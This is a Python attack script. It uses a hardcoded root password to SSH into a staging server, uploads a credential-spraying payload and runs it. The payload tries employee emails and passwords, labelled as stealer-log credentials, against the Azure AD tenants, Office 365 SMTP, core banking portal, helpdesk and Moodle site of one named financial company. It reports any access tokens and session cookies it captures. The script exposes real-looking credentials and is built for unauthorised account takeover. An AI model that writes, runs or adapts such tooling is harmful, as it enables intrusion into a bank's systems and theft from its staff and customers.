import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re, time, smtplib, ssl
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# Stealer creds — SKIP admin@findep.global (LOCKED)
CREDS = [
    ("mmartinez@findep.global", "Rul76846"),
    ("mmartinez@findep.global", "rul76846"),
    ("bemedezar@findep.global", "AFI2022*"),
    ("jsanchezfern@findep.global", "AFI2022*"),
    ("jsanchezfern@findep.global", "afi2022*"),
    # Try @findep.com.mx variants
    ("mmartinez@findep.com.mx", "Rul76846"),
    ("bemedezar@findep.com.mx", "AFI2022*"),
    ("jsanchezfern@findep.com.mx", "AFI2022*"),
    ("bmendezar@findep.com.mx", "AFI2022*"),
    # Try @findep.mx
    ("mmartinez@findep.mx", "Rul76846"),
    ("jsanchezfern@findep.mx", "AFI2022*"),
    ("bemedezar@findep.mx", "AFI2022*"),
    # Admin passwords on other users
    ("mmartinez@findep.global", "4dm1n##*2411"),
    ("mmartinez@findep.global", "BcF1s42o2d*"),
]


# ========================================
# 1. AZURE AD ROPC — ALL TENANTS
# ========================================
sys.stdout.write("=" * 60 + "\n=== AZURE AD ROPC — STEALER CREDS ===\n" + "=" * 60 + "\n\n")

# Known tenants
TENANTS = {
    "findep.global": "30fcec21-d05d-4ca6-8233-a90183fc7dbd",
    "findep.com.mx": None,  # Will discover
    "findep.dev": None,     # Will discover
}

# Discover tenants
for domain in ["findep.com.mx", "findep.dev", "findep.mx"]:
    try:
        r = requests.get(f"https://login.microsoftonline.com/{domain}/.well-known/openid-configuration", timeout=5)
        if r.status_code == 200:
            tid = re.search(r'"issuer":"[^"]*?([a-f0-9-]{36})', r.text)
            if tid:
                TENANTS[domain] = tid.group(1)
                sys.stdout.write(f"  Tenant {domain}: {tid.group(1)}\n")
    except:
        pass

# ROPC spray (CAREFUL — skip admin@findep.global)
for email, pwd in CREDS:
    domain = email.split("@")[1]
    tenant = TENANTS.get(domain)
    if not tenant:
        continue
    
    # Skip locked admin
    if email == "admin@findep.global":
        continue
    
    try:
        r = requests.post(f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
            data={
                "grant_type": "password",
                "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # Azure PowerShell
                "scope": "https://graph.microsoft.com/.default",
                "username": email,
                "password": pwd,
            },
            headers={"User-Agent": UA}, timeout=10)
        
        data = r.json()
        
        if "access_token" in data:
            sys.stdout.write(f"\n*** AZURE AD LOGIN SUCCESS ***\n")
            sys.stdout.write(f"  {email} : {pwd}\n")
            sys.stdout.write(f"  Token: {data['access_token'][:80]}...\n")
            sys.stdout.write(f"  Scope: {data.get('scope', 'N/A')}\n")
            sys.stdout.write(f"  Expires: {data.get('expires_in', 'N/A')}\n\n")
            
            # Get user info
            token = data["access_token"]
            r_me = requests.get("https://graph.microsoft.com/v1.0/me",
                headers={"Authorization": f"Bearer {token}"}, timeout=10)
            if r_me.status_code == 200:
                me = r_me.json()
                sys.stdout.write(f"  Name: {me.get('displayName')}\n")
                sys.stdout.write(f"  Job: {me.get('jobTitle')}\n")
                sys.stdout.write(f"  Mail: {me.get('mail')}\n")
                sys.stdout.write(f"  UPN: {me.get('userPrincipalName')}\n\n")
        else:
            error = data.get("error_description", "")[:100]
            code = data.get("error", "")
            # Parse AADSTS code
            aadsts = re.search(r'AADSTS(\d+)', error)
            aadsts_code = aadsts.group(0) if aadsts else code
            
            tag = ""
            if "50034" in error:
                tag = "USER_NOT_FOUND"
            elif "50126" in error:
                tag = "WRONG_PASSWORD (user EXISTS!)"
            elif "50053" in error:
                tag = "LOCKED_OUT"
            elif "50055" in error:
                tag = "PASSWORD_EXPIRED (user EXISTS!)"
            elif "50057" in error:
                tag = "ACCOUNT_DISABLED (user EXISTS!)"
            elif "50076" in error or "50079" in error:
                tag = "MFA_REQUIRED (creds VALID!)"
            elif "700016" in error:
                tag = "APP_NOT_FOUND"
            elif "53003" in error:
                tag = "CONDITIONAL_ACCESS_BLOCK (creds may be VALID!)"
            else:
                tag = aadsts_code
            
            sys.stdout.write(f"  [{tag}] {email}:{pwd[:10]}... ({domain})\n")
            
            if "MFA" in tag or "CONDITIONAL" in tag or "EXPIRED" in tag:
                sys.stdout.write(f"  !!! CREDENTIALS VALID — {tag} !!!\n\n")
    except Exception as e:
        sys.stdout.write(f"  ERR {email}: {str(e)[:60]}\n")
    
    time.sleep(1)  # Cooldown
    sys.stdout.flush()


# ========================================
# 2. SMTP OFFICE 365 (jsanchezfern)
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== SMTP OFFICE 365 TEST ===\n" + "=" * 60 + "\n\n")

smtp_creds = [
    ("jsanchezfern@findep.global", "AFI2022*"),
    ("bemedezar@findep.global", "AFI2022*"),
    ("mmartinez@findep.global", "Rul76846"),
]

for email, pwd in smtp_creds:
    try:
        context = ssl.create_default_context()
        server = smtplib.SMTP("smtp.office365.com", 587, timeout=10)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(email, pwd)
        sys.stdout.write(f"*** SMTP LOGIN SUCCESS *** {email}:{pwd}\n")
        server.quit()
    except smtplib.SMTPAuthenticationError as e:
        sys.stdout.write(f"  SMTP AUTH FAIL {email}: {str(e)[:100]}\n")
    except Exception as e:
        sys.stdout.write(f"  SMTP ERR {email}: {str(e)[:80]}\n")
    sys.stdout.flush()


# ========================================
# 3. CORE BANKING (core.findep.mx)
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== CORE BANKING LOGIN ===\n" + "=" * 60 + "\n\n")

core_creds = [
    ("mmartinez", "Rul76846"),
    ("bemedezar", "AFI2022*"),
    ("jsanchezfern", "AFI2022*"),
    ("bmendezar", "AFI2022*"),
    ("admin", "4dm1n##*2411"),
    ("admin", "BcF1s42o2d*"),
    # Full email
    ("mmartinez@findep.global", "Rul76846"),
    ("mmartinez@findep.com.mx", "Rul76846"),
    ("bemedezar@findep.global", "AFI2022*"),
    ("jsanchezfern@findep.global", "AFI2022*"),
]

for user, pwd in core_creds:
    try:
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": UA})
        
        r = s.post("https://core.findep.mx/valida.do",
            data={"cveUsr": user, "msjPass": pwd, "cve_idToken": ""},
            timeout=10, allow_redirects=False)
        
        tag = ""
        if r.status_code in [302, 301]:
            loc = r.headers.get("Location", "")
            if "principal" in loc.lower() or "menu" in loc.lower() or "inicio" in loc.lower():
                tag = "*** LOGIN SUCCESS ***"
            else:
                tag = f"-> {loc[:60]}"
        elif r.status_code == 200:
            if len(r.text) > 5000:
                has_error = "error" in r.text[:2000].lower() or "incorrecto" in r.text[:2000].lower()
                tag = "LOGIN PAGE (fail)" if has_error else f"200 ({len(r.text)}b)"
            else:
                tag = f"200 ({len(r.text)}b)"
        
        sys.stdout.write(f"  [{r.status_code}] {user}:{pwd[:10]}... {tag}\n")
        if "SUCCESS" in tag:
            sys.stdout.write(f"  Cookies: {dict(s.cookies)}\n\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 4. PPP KHOR (ppp.findep.mx)
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== PPP KHOR LOGIN ===\n" + "=" * 60 + "\n\n")

ppp_creds = [
    ("mmartinez@findep.global", "Rul76846"),
    ("mmartinez@findep.com.mx", "Rul76846"),
    ("bemedezar@findep.global", "AFI2022*"),
    ("jsanchezfern@findep.global", "AFI2022*"),
    ("admin@findep.global", "4dm1n##*2411"),
    ("admin@findep.global", "BcF1s42o2d*"),
    ("mmartinez", "Rul76846"),
    ("admin", "4dm1n##*2411"),
]

for user, pwd in ppp_creds:
    try:
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": UA})
        
        # Step 1: GET login page
        r0 = s.get("https://ppp.findep.mx/", timeout=10)
        csrf = re.search(r'name="CSRFToken"\s+value="([^"]+)"', r0.text)
        
        # Step 2: POST mode
        s.post("https://ppp.findep.mx/", data={"modo": "user"}, timeout=10)
        
        # Step 3: POST login
        r = s.post("https://ppp.findep.mx/",
            data={"usr": user, "pwd": pwd, "modo": "user",
                  "CSRFToken": csrf.group(1) if csrf else "", "embedded": "0"},
            timeout=10, allow_redirects=False)
        
        tag = ""
        if r.status_code in [302, 301]:
            loc = r.headers.get("Location", "")
            if "login" not in loc.lower() and loc != "/":
                tag = f"*** POSSIBLE LOGIN *** -> {loc[:60]}"
            else:
                tag = f"-> {loc[:60]} (back to login)"
        elif r.status_code == 200:
            if "bienvenido" in r.text[:3000].lower() or "dashboard" in r.text[:3000].lower():
                tag = "*** LOGIN SUCCESS ***"
            else:
                tag = f"200 ({len(r.text)}b)"
        
        sys.stdout.write(f"  [{r.status_code}] {user[:25]}:{pwd[:10]}... {tag}\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 5. FOOTPRINTS (pao.findep.com.mx)
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== FOOTPRINTS LOGIN ===\n" + "=" * 60 + "\n\n")

fp_creds = [
    ("mmartinez", "Rul76846"),
    ("bemedezar", "AFI2022*"),
    ("jsanchezfern", "AFI2022*"),
    ("admin", "4dm1n##*2411"),
    ("admin", "BcF1s42o2d*"),
    ("bmendezar", "AFI2022*"),
]

baseline_size = None
for user, pwd in fp_creds:
    try:
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": UA})
        
        r = s.post("https://pao.findep.com.mx/MRcgi/MRlogin.pl",
            data={"USER": user, "PASSWORD": pwd, "USERID": user,
                  "MRSubmit": "Submit", "PROJECTID": "1", "LASTSTEP": "1"},
            timeout=10, allow_redirects=False)
        
        if baseline_size is None:
            baseline_size = len(r.text)
        
        diff = len(r.text) - baseline_size
        tag = ""
        if r.status_code in [302, 301]:
            tag = f"*** REDIRECT *** -> {r.headers.get('Location', '')[:60]}"
        elif abs(diff) > 200:
            tag = f"SIZE DIFF {diff:+d}"
        
        cookies = dict(s.cookies)
        if cookies:
            tag += f" COOKIES: {cookies}"
        
        sys.stdout.write(f"  [{r.status_code}] ({len(r.text)}b) {user}:{pwd[:10]}... {tag}\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 6. MOODLE (universidad.findep.mx)
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== MOODLE LOGIN ===\n" + "=" * 60 + "\n\n")

moodle_creds = [
    ("mmartinez", "Rul76846"),
    ("bemedezar", "AFI2022*"),
    ("jsanchezfern", "AFI2022*"),
    ("bmendezar", "AFI2022*"),
    ("admin", "4dm1n##*2411"),
    ("admin", "BcF1s42o2d*"),
    # Email variants
    ("mmartinez@findep.global", "Rul76846"),
    ("mmartinez@findep.com.mx", "Rul76846"),
    ("mlunavald", "Rul76846"),
    ("mlunavald", "AFI2022*"),
    ("pgonzalezz", "Rul76846"),
    ("pgonzalezz", "AFI2022*"),
]

MOODLE = "https://universidad.findep.mx"
for user, pwd in moodle_creds:
    try:
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": UA})
        
        r0 = s.get(f"{MOODLE}/login/index.php", timeout=10)
        lt = re.search(r'name="logintoken"\s+value="([^"]+)"', r0.text)
        
        r = s.post(f"{MOODLE}/login/index.php",
            data={"username": user, "password": pwd, "logintoken": lt.group(1) if lt else ""},
            timeout=10, allow_redirects=True)
        
        logged_in = user.split("@")[0] in r.text.lower() or "loggedinas" in r.text.lower()
        
        if logged_in:
            sys.stdout.write(f"  *** MOODLE LOGIN *** {user}:{pwd}\n")
        else:
            sys.stdout.write(f"  FAIL {user}:{pwd[:10]}...\n")
    except:
        pass
    sys.stdout.flush()


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/fp_stealer_spray.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/fp_stealer_spray.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
